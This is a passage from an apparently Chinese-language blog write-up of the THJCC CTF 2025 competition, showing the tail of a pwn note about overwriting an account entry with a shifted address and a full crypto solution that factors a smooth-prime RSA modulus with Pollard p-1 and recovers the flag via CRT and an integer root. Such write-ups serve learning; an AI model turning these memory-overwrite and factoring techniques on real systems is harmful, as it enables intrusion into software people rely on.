<p><a href="mailto:&#x73;&#x6c;&#x65;&#101;&#112;&#64;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#116;">&#x73;&#x6c;&#x65;&#101;&#112;&#64;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#116;</a> 在 account[-14]</p>
<p>原本 account[-14] &#x3D; 0x55555090 &#x3D;&gt; 改成 0x55555250<br>0x55555250 - 0x55555090 &#x3D; 448<br> <img src="https://hackmd.io/_uploads/rk9nrCZlee.png" alt="image"></p>
<h4 id="crypto-Proactive-Planning"><a href="#crypto-Proactive-Planning" class="headerlink" title="(crypto) Proactive Planning"></a>(crypto) Proactive Planning</h4><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genPrime</span>()-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            p *= getrandbits(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> p + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10</span></span><br><span class="line">m = bytes_to_long(FLAG)   </span><br><span class="line">p, q = (genPrime(), genPrime())</span><br><span class="line">C = (<span class="built_in">pow</span>(m, e, p), <span class="built_in">pow</span>(m, e, q))</span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;N = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;C = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>output.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N = 245420687480030910293131014681513097316897805860015907997290238793037908061889321970643067747599071632004876697443892740373461832739897404992824039705666859978685676148256731481249619240551600688298823327813334982026265819211162436599172552911207622820925395779431967038741077978296032479504244355879076453277839429545428814902805521915851958370011985365075951876093117572939169114186231535255600467275910045372664823195201131313527121300982333739031725446282902152339315042184197622728983863008210927860642758785909138094209306401823250950926284525837770539470052437688590958247465743249015240761650092149407846622211263071037972525183724098938285521476262814934333028607057009674482959012439713961806522389998648832738221606988997592254025463923056643491555337751576246212477882961978575063306242120071365998703341290638505057206765318294021015227372445846979566876416540849080721228851969658123571699007157401963955407592209580070811271329855359365939200000000000000000000000000000000000000000000000000000000000001</span><br><span class="line">e = 16</span><br><span class="line">C = (439231781791682053787800004789500090515405069827267575310144126412212073183656886443512317513437473988568312910849382831051282684866166595013378449246972680452849180695018251047606404399499477181963259998873867440078915470666285294221911483418402164843781527921484550804953154534529236021532462370697370102805338053891442902369171104271440920515546754256339545640481851380162960169019944927911544549873309962781026864701346082115190565271316812955086674541362687313443721995481784918571627855813953908700661871, 45410653305386550806460293366683163840683840887693958374757667150684575232478721464002571675632111383800324454952726849708032360360624723016258879665846393001487751401561000041560174839749619393896575704973412066318065208130082079245493618249592605498133955508921363368248057347635043808420720293553618262120872986948419118763039316625791521751697579251125903615079781604221702413469589144193751155342922907250225850266858411329191983637433918466243662523860234353921039582601873103221279579701559507155136)</span><br></pre></td></tr></table></figure>
<ol>
<li><p>N 質因數 p 的 p-1 是平滑的（因數都很小）<br>&#x3D;&gt; N 是平滑數 &#x3D;&gt; 用 pollard 分解 N</p>
</li>
<li><p>c1 &#x3D; m^e mod p<br>c2 &#x3D; m^e mod q</p>
</li>
</ol>
<p>m^e ≡ c1 mod p<br>m^e ≡ c2 mod q<br>&#x3D;&gt; 中國剩餘定理解出^e</p>
<ol start="3">
<li>e 夠小，可直接開跟解出 m</li>
</ol>
<p>solve.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">245420687480030910293131014681513097316897805860015907997290238793037908061889321970643067747599071632004876697443892740373461832739897404992824039705666859978685676148256731481249619240551600688298823327813334982026265819211162436599172552911207622820925395779431967038741077978296032479504244355879076453277839429545428814902805521915851958370011985365075951876093117572939169114186231535255600467275910045372664823195201131313527121300982333739031725446282902152339315042184197622728983863008210927860642758785909138094209306401823250950926284525837770539470052437688590958247465743249015240761650092149407846622211263071037972525183724098938285521476262814934333028607057009674482959012439713961806522389998648832738221606988997592254025463923056643491555337751576246212477882961978575063306242120071365998703341290638505057206765318294021015227372445846979566876416540849080721228851969658123571699007157401963955407592209580070811271329855359365939200000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line">e = <span class="number">16</span></span><br><span class="line">C = (<span class="number">439231781791682053787800004789500090515405069827267575310144126412212073183656886443512317513437473988568312910849382831051282684866166595013378449246972680452849180695018251047606404399499477181963259998873867440078915470666285294221911483418402164843781527921484550804953154534529236021532462370697370102805338053891442902369171104271440920515546754256339545640481851380162960169019944927911544549873309962781026864701346082115190565271316812955086674541362687313443721995481784918571627855813953908700661871</span>, <span class="number">45410653305386550806460293366683163840683840887693958374757667150684575232478721464002571675632111383800324454952726849708032360360624723016258879665846393001487751401561000041560174839749619393896575704973412066318065208130082079245493618249592605498133955508921363368248057347635043808420720293553618262120872986948419118763039316625791521751697579251125903615079781604221702413469589144193751155342922907250225850266858411329191983637433918466243662523860234353921039582601873103221279579701559507155136</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    a, b = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, b, n)</span><br><span class="line">        p = GCD(a - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">        b += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = pollard(N)</span><br><span class="line">q = N//p</span><br><span class="line"><span class="built_in">print</span>(p,q)</span><br><span class="line"><span class="keyword">assert</span> p*q == N</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = m^e mod p </span></span><br><span class="line"><span class="string">c2 = m^e mod q</span></span><br><span class="line"><span class="string">m^e ≡ c1 mod p</span></span><br><span class="line"><span class="string">m^e ≡ c2 mod q</span></span><br><span class="line"><span class="string">M = p*q</span></span><br><span class="line"><span class="string">M1 = M/m1 = q</span></span><br><span class="line"><span class="string">M2 = M/m2 = p</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">me = (q * inverse(q,p) * C[<span class="number">0</span>] + p * inverse(p,q) * C[<span class="number">1</span>]) % N</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(me,<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">p, q = q, p <span class="comment"># 順序錯誤會導致錯誤結果</span></span><br><span class="line">me = (q * inverse(q,p) * C[<span class="number">0</span>] + p * inverse(p,q) * C[<span class="number">1</span>]) % N</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(me,<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">529049093593735347951473078696308452125896686395604221378429</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/By2Hn4Mxex.png" alt="image"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tag/">Tag</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WarmUp"><span class="toc-number">1.</span> <span class="toc-text">WarmUp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome"><span class="toc-number">1.1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#beep-boop-beep-boop"><span class="toc-number">1.2.</span> <span class="toc-text">beep boop beep boop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Discord-Challenge"><span class="toc-number">1.3.</span> <span class="toc-text">Discord Challenge</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Headless"><span class="toc-number">2.1.</span> <span class="toc-text">Headless</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nothing-here-%F0%9F%91%80"><span class="toc-number">2.2.</span> <span class="toc-text">Nothing here 👀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#APPL3-STOR3%F0%9F%8D%8E"><span class="toc-number">2.3.</span> <span class="toc-text">APPL3 STOR3🍎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lime-Ranger"><span class="toc-number">2.4.</span> <span class="toc-text">Lime Ranger</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#network-noise"><span class="toc-number">3.1.</span> <span class="toc-text">network noise</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Seems-like-someone%E2%80%99s-breaking-down%F0%9F%98%82"><span class="toc-number">3.2.</span> <span class="toc-text">Seems like someone’s breaking down😂</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setsuna-Message"><span class="toc-number">3.3.</span> <span class="toc-text">Setsuna Message</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hidden-in-memory%E2%80%A6"><span class="toc-number">3.4.</span> <span class="toc-text">Hidden in memory…</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pyjail02"><span class="toc-number">3.5.</span> <span class="toc-text">Pyjail02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pyjail01"><span class="toc-number">3.6.</span> <span class="toc-text">Pyjail01</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-Shopping"><span class="toc-number">4.1.</span> <span class="toc-text">Flag Shopping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Money-Overflow"><span class="toc-number">4.2.</span> <span class="toc-text">Money Overflow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Shell"><span class="toc-number">4.3.</span> <span class="toc-text">Insecure Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Once"><span class="toc-number">4.4.</span> <span class="toc-text">Once</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Little-Parrot"><span class="toc-number">4.5.</span> <span class="toc-text">Little Parrot</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Twins"><span class="toc-number">5.1.</span> <span class="toc-text">Twins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DAES"><span class="toc-number">5.2.</span> <span class="toc-text">DAES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Frequency-Freakout"><span class="toc-number">5.3.</span> <span class="toc-text">Frequency Freakout</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SNAKE"><span class="toc-number">5.4.</span> <span class="toc-text">SNAKE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Yoshino%E2%80%99s-Secret"><span class="toc-number">5.5.</span> <span class="toc-text">Yoshino’s Secret</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Speeded-Block-Cipher"><span class="toc-number">5.6.</span> <span class="toc-text">Speeded Block Cipher</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">6.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A5%BF"><span class="toc-number">6.1.</span> <span class="toc-text">西</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#time-GEM"><span class="toc-number">6.2.</span> <span class="toc-text">time_GEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Hunter-%F0%9F%90%8D"><span class="toc-number">6.3.</span> <span class="toc-text">Python Hunter 🐍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-Checker"><span class="toc-number">6.4.</span> <span class="toc-text">Flag Checker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Noo-dle"><span class="toc-number">6.5.</span> <span class="toc-text">Noo dle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Empty"><span class="toc-number">6.6.</span> <span class="toc-text">Empty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Demon-Summoning"><span class="toc-number">6.7.</span> <span class="toc-text">Demon Summoning</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Feedback"><span class="toc-number">7.</span> <span class="toc-text">Feedback</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B3%BD%E5%BE%8C%E8%A7%A3%E5%87%BA"><span class="toc-number">8.</span> <span class="toc-text">賽後解出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web-proxy-under-development"><span class="toc-number">8.1.</span> <span class="toc-text">(web) proxy | under_development</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-iCloud%E2%98%81%EF%B8%8F"><span class="toc-number">8.2.</span> <span class="toc-text">(web) iCloud☁️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn-Bank-Clerk"><span class="toc-number">8.3.</span> <span class="toc-text">(pwn)Bank Clerk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crypto-Proactive-Planning"><span class="toc-number">8.4.</span> <span class="toc-text">(crypto) Proactive Planning</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&text=THJCC CTF 2025 WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&is_video=false&description=THJCC CTF 2025 WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=THJCC CTF 2025 WriteUp&body=Check out this article: http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&title=THJCC CTF 2025 WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&name=THJCC CTF 2025 WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/THJCC-CTF-2025-WriteUp/&t=THJCC CTF 2025 WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    wang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tag/">Tag</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
